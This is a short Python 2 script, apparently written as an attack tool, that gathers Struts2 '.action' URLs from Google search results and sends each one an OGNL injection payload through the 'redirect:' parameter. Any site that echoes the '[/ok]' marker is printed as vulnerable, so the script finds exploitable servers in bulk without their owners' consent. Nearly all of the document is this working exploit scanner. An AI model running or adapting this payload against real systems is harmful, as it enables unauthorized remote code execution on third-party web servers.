#! /usr/bin/env python
# -*-coding:cp936-*-
#  by: x55admin
# 用法：Key?: 关键字 inurl:.action?

import urllib2,urllib,threading,Queue,os 
import msvcrt 
import json 
import sys 
import re

seachstr = raw_input("Key?:") 
pagenum = raw_input("How many?:") 
pagenum = int(pagenum)/8+1
line = 1

class googlesearch(threading.Thread): 
    def __init__(self): 
        threading.Thread.__init__(self) 
        self.urls= [] 
    def run(self): 
        while 1: 
            self.catchURL() 
            queue.task_done() 
    def catchURL(self):
        self.key = seachstr.decode('gbk').encode('utf-8') 
        self.page= str(queue.get()) 
        url = ('https://ajax.googleapis.com/ajax/services/search/web?v=1.0&q=%s&rsz=8&start=%s') % (urllib.quote(self.key),self.page) 
        try: 
            request = urllib2.Request(url) 
            response = urllib2.urlopen(request) 
            results = json.load(response) 
            URLinfo = results['responseData']['results'] 
        except Exception,e: 
            print e
        else: 
            for info in URLinfo:
                try:
                    url_unre= info['url']
                    re_url=r'(http://.+action)'
                    url_re=re.findall(re_url,url_unre)
                    test_exp="?redirect:${%23w%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23w.println('[/ok]'),%23w.flush(),%23w.close()}"
                    test_url= url_re[0]+test_exp
                    request = urllib2.Request(test_url) 
                    response = urllib2.urlopen(request).read(8)
                                       
                    if "[/ok]" in response :
                        print url_re[0]
                        print '发现1个漏洞地址……'
                    else :
                        print "not need url……"
                        continue
                except :
                    print "error……"
                    
                    
class ThreadGetKey(threading.Thread): 
    def run(self): 
        while 1: 
            try: 
                chr = msvcrt.getch() 
                if chr == 'q': 
                    print "stopped by your action ( q )" 
                    os._exit(1) 
                else: 
                    continue
            except: 
                os._exit(1) 

if __name__ == '__main__': 
    pages=[] 
    queue = Queue.Queue() 
    for i in range(1,pagenum+1): 
        pages.append(i) 
    for n in pages: 
        queue.put(n) 
    ThreadGetKey().start() 
    for p in range(line): 
        googlesearch().start()
